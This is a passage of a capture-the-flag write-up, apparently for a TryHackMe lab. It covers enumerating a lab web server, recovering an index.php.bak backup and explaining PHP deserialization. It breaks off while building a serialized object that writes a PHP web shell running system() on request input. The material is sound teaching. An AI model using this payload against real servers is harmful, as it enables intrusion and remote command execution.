&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:35] 301 -  313B  - /backup  -&amp;gt;  http://10.10.51.225/backup/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:36] 200 -    2KB - /backup/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:45] 200 -   11KB - /index.html
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:46] 301 -  317B  - /javascript  -&amp;gt;  http://10.10.51.225/javascript/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:46] 200 -    6KB - /index.php
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:30:46] 200 -    6KB - /index.php/login/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:31:02] 200 -    2KB - /readme.md
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:31:03] 403 -  277B  - /server-status/
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[13:31:03] 403 -  277B  - /server-status
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Task Completed
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403133131.png&#34; alt=&#34;Pasted image 20210403133131.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Alright, we can see &lt;code&gt;/backup/&lt;/code&gt; directory and &lt;code&gt;/readme.md&lt;/code&gt; which also seems kinda interesting. Let&amp;rsquo;s visit these and see what&amp;rsquo;s hosted in them.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;http://10.10.51.225/readme.md
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s cURL it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$~ curl -i http://10.10.51.225/readme.md

&lt;span style=&#34;color:#75715e&#34;&gt;# Welcome to Base                 &lt;/span&gt;
A super simple, responsive framework built to work on mobile devices, tablets, netbooks and desktop computers.

&lt;span style=&#34;color:#75715e&#34;&gt;## Reasons to use base for your next web project&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;### Responsive Design&lt;/span&gt;
Built &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; all devices big and small, base has got you covered.

&lt;span style=&#34;color:#75715e&#34;&gt;### Foundation Styles&lt;/span&gt;
Custom styles &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; headings, tables, blockquotes forms and much more.

&lt;span style=&#34;color:#75715e&#34;&gt;### Accessibility in mind&lt;/span&gt;
Works with screen readers in mind and has JS fallbacks.

&lt;span style=&#34;color:#75715e&#34;&gt;### Easy to learn&lt;/span&gt;
Well commented CSS to ensure your implementation is a breeze.

&lt;span style=&#34;color:#75715e&#34;&gt;### Cross-Browser&lt;/span&gt;
Covers IE7+ and modern browsers such as Chrome, Firefox and Opera.

&lt;span style=&#34;color:#75715e&#34;&gt;### Base is Awesome!&lt;/span&gt;
Preview the &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;demo page&lt;span style=&#34;color:#f92672&#34;&gt;](&lt;/span&gt;http://matthewhartman.github.com/base/demo/&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; to see the Base Framework in all its glory! :&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;


&lt;span style=&#34;color:#75715e&#34;&gt;## Repo Contents&lt;/span&gt;
1. readme.md - Feel free to delete this! ;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
2. index.html - An example page with Base in action
3. style.css - Base stylesheet including styles &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; headings, tables, body content, etc
4. default.js - Base javascript file to get you started

Base was built by Matthew Hartman &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@hartmanmatthew&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, a passionate front end developer based in Melbourne, Australia.

&lt;span style=&#34;color:#75715e&#34;&gt;## Thank You / Credits&lt;/span&gt;
- Mark Otto &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@mdo&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;amp; Jacob Thornton &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@fat&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; some base styles taken from BootStrap
- Nicolas Gallagher &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;@necolas&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the Micro ClearFix :&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that it returns README.md source of some repository, maybe we can explore it later?&lt;/p&gt;
&lt;p&gt;For now, let&amp;rsquo;s move to the &lt;code&gt;/backup/&lt;/code&gt; folder&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;http://10.10.51.225/backup/
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403133609.png&#34; alt=&#34;Pasted image 20210403133609.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;/backup/&lt;/code&gt; directory contains interesting .bak files, let&amp;rsquo;s &lt;code&gt;cURL&lt;/code&gt; those one by one and see their source code.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;â”Œâ”€â”€&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rootðŸ’€b0x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tools/dirsearch&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
â””â”€# curl -i http://10.10.51.225/backup/index.html.bak                                                    
HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK                                                                                          
Date: Sat, &lt;span style=&#34;color:#ae81ff&#34;&gt;03&lt;/span&gt; Apr &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; 08:36:44 GMT                                                                      
Server: Apache/2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                           
Last-Modified: Wed, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; 01:10:05 GMT                                                             
ETag: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2c39-5bd2453bf4a05&amp;#34;&lt;/span&gt;                                                                               
Accept-Ranges: bytes                                                                                     
Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;11321&lt;/span&gt;                                                                                    
Content-Type: application/x-trash                                                                        
                                                    
                                                    
&amp;lt;!DOCTYPE html PUBLIC &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&lt;/span&gt;&amp;gt;                                                                                          
&amp;lt;html xmlns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.w3.org/1999/xhtml&amp;#34;&lt;/span&gt;&amp;gt;
  &amp;lt;!--
    Modified from the Debian original &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  --&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta http-equiv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt; content&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/html; charset=UTF-8&amp;#34;&lt;/span&gt; /&amp;gt;
    &amp;lt;title&amp;gt;Apache2 Ubuntu Default Page: It works&amp;lt;/title&amp;gt;
    &amp;lt;style type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; media&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;screen&amp;#34;&lt;/span&gt;&amp;gt;
  * &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

  body, html &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    padding: 3px 3px 3px 3px;

    background-color: &lt;span style=&#34;color:#75715e&#34;&gt;#D8DBE2;&lt;/span&gt;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

  div.main_page &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that the page also points to default Apache installation page. Let&amp;rsquo;s try &lt;code&gt;.php.bak&lt;/code&gt; file now.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll be downloading and analysing it in Sublime text (text editor).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;â”Œâ”€â”€&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rootðŸ’€b0x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tools/dirsearch&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
â””â”€# curl http://10.10.51.225/backup/index.php.bak -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;6399&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;6399&lt;/span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;10438&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; --:--:-- --:--:-- --:--:-- &lt;span style=&#34;color:#ae81ff&#34;&gt;10438&lt;/span&gt;
                                                                                                                     
â”Œâ”€â”€&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rootðŸ’€b0x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tools/dirsearch&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
â””â”€# 
                                                                                                    
â”Œâ”€â”€&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rootðŸ’€b0x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tools/dirsearch&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
â””â”€# head index.php.bak    
&amp;lt;!doctype html&amp;gt;
&amp;lt;html lang&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt; class&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no-js&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;meta charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&amp;gt;
  &amp;lt;title&amp;gt;Base&amp;lt;/title&amp;gt;
  &amp;lt;meta name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt; content&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt;
  &amp;lt;meta name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; content&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, minimum-scale=1.0, maximum-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
  &amp;lt;link rel&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; media&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;screen&amp;#34;&lt;/span&gt; href&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;style.css&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;In the heading, we can see that it too points to the same framework &lt;strong&gt;Base&lt;/strong&gt; which was discussed above in the README.md file, let&amp;rsquo;s try searching this framework.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134059.png&#34; alt=&#34;Pasted image 20210403134059.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;So, the guy has deleted this repository (base) from his github account. Maybe shifted somewhere else? Let&amp;rsquo;s try searching it on google rather than using the link from &lt;code&gt;readme.md&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134336.png&#34; alt=&#34;Pasted image 20210403134336.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Seeing the &lt;code&gt;readme.md&lt;/code&gt; contents again, we can probably deduce that this framework (if used) is only going to be used for styling. Since, it doesn&amp;rsquo;t mention anywhere in the &lt;code&gt;README.md&lt;/code&gt; file that there is any PHP code in it.&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We can continue reading the source code of the &lt;code&gt;index.php.bak&lt;/code&gt; file for now.&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;We can see on line 216 &amp;ndash; 220. We can just input a &lt;code&gt;$_GET[&#39;debug&#39;]&lt;/code&gt; debug parameter with serialize input and the source code will unserialize it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134619.png&#34; alt=&#34;Pasted image 20210403134619.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We know that the code is vulnerable to PHP Deserialization but how to exploi this? We only have the .bak file and this won&amp;rsquo;t execute/render as PHP on the server.&lt;/p&gt;
&lt;p&gt;Were there any hidden directories we missed while the enumeration?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134923.png&#34; alt=&#34;Pasted image 20210403134923.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yes! we didn&amp;rsquo;t discuss &lt;code&gt;/index.php&lt;/code&gt; file, let&amp;rsquo;s try accessing it.&lt;/p&gt;
&lt;p&gt;The page looks something like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403134959.png&#34; alt=&#34;Pasted image 20210403134959.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;h3 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Alright, now time for the exploitation. Before that, we need to learn what &lt;strong&gt;PHP deserialization&lt;/strong&gt; is and before that, what is &lt;strong&gt;serialization&lt;/strong&gt;?&lt;/p&gt;
&lt;p&gt;We use &lt;strong&gt;serialization&lt;/strong&gt; when we want a &lt;code&gt;piece of code&lt;/code&gt; or some object to be stored in a &lt;strong&gt;database&lt;/strong&gt; or when we&amp;rsquo;re expecting some &lt;em&gt;piece of code&lt;/em&gt; through an &lt;strong&gt;API call&lt;/strong&gt; or something and then we want to execute it/load it.&lt;/p&gt;
&lt;p&gt;If you&amp;rsquo;re a programmer, you might have come across this hurdle, to solve this, you always need to create a new file, write the source code in it and execute the file manually.&lt;/p&gt;
&lt;p&gt;To not do the above^, we use &lt;strong&gt;serialization&lt;/strong&gt;, it takes your piece of code/object, &lt;strong&gt;serializes&lt;/strong&gt; it and stores in the &lt;strong&gt;database&lt;/strong&gt; and while retreiving it, it &lt;strong&gt;unserializes&lt;/strong&gt; the &lt;code&gt;piece of code&lt;/code&gt; and executes it.&lt;/p&gt;
&lt;p&gt;For the &lt;em&gt;API call&lt;/em&gt;, it just receieves &lt;strong&gt;serialized code&lt;/strong&gt; already and executes it while &lt;strong&gt;unserializing&lt;/strong&gt; it.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note: It is always recommended to never take any input either through database or through APIs or any files on the system and mostly don&amp;rsquo;t even use deserialization if not really required. If it&amp;rsquo;s required, never let the user control the parameters!&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;P.S ~ The above information about serialization is generic and not only based on PHP de(serialization)!&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;You can find more details in this &lt;a href=&#34;https://www.youtube.com/watch?v=gTXMFrctYLE&#34;&gt;youtube video&lt;/a&gt; created by a friend of mine; &lt;a href=&#34;https://www.linkedin.com/in/mukarramkhalid/&#34;&gt;Mukarram Khalid&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So, now that we&amp;rsquo;ve a base understanding of what &lt;strong&gt;serialization&lt;/strong&gt; is, let&amp;rsquo;s move to the &lt;em&gt;source code&lt;/em&gt; and see what we can &lt;strong&gt;exploit&lt;/strong&gt; here.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;We can see that the PHP code is using a magic function (i.e. &lt;code&gt;__destruct()&lt;/code&gt;)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FormSubmit&lt;/span&gt; {

&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $form_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message.txt&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;

&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SaveMessage&lt;/span&gt;() {

$NameArea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]; 
$EmailArea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;];
$TextArea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;comments&amp;#39;&lt;/span&gt;];

	$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Message From : &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $NameArea &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; || From Email : &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $EmailArea &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; || Comment : &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $TextArea &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;

}

&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct() {

&lt;span style=&#34;color:#a6e22e&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__DIR__&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;form_file&lt;/span&gt;,$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;FILE_APPEND&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your submission has been successfully saved!&amp;#39;&lt;/span&gt;;

}

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;h4 id=&#34;what-is-__destruct&#34;&gt;What is &lt;code&gt;__destruct&lt;/code&gt;?&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;__destruct&lt;/code&gt; magic method is used to always run or do a task at the end of the execution. Let&amp;rsquo;s say we want to do something everytime (maybe update a local log file?), it&amp;rsquo;ll do that in the end of the execution.&lt;/p&gt;
&lt;p&gt;What is it doing in the above application?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct() {

&lt;span style=&#34;color:#a6e22e&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__DIR__&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;form_file&lt;/span&gt;,$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;FILE_APPEND&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your submission has been successfully saved!&amp;#39;&lt;/span&gt;;

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;It&amp;rsquo;s creating a file in our &lt;code&gt;__DIR__&lt;/code&gt; (or &lt;code&gt;pwd&lt;/code&gt;) in the directory and with the message whatever is specified (using the two properties being used from the class)&lt;/li&gt;
&lt;li&gt;It then echo&amp;rsquo;s a string: &amp;lsquo;Your submission has been successfully saved&amp;rsquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;ndash;&lt;/p&gt;
&lt;p&gt;Now, we can write our own code matching the above^ but just change the contents and the file name, let&amp;rsquo;s try it.&lt;/p&gt;
&lt;p&gt;Remember, we need to use the same &lt;strong&gt;class name&lt;/strong&gt; and &lt;strong&gt;same properties names&lt;/strong&gt;!&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FormSubmit&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $form_file 	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;umar0x01.php&amp;#39;&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $message 	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;?php system($_GET[123]); ?&amp;gt;&amp;#39;&lt;/span&gt;;
}

$newObj 	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FormSubmit&lt;/span&gt;;

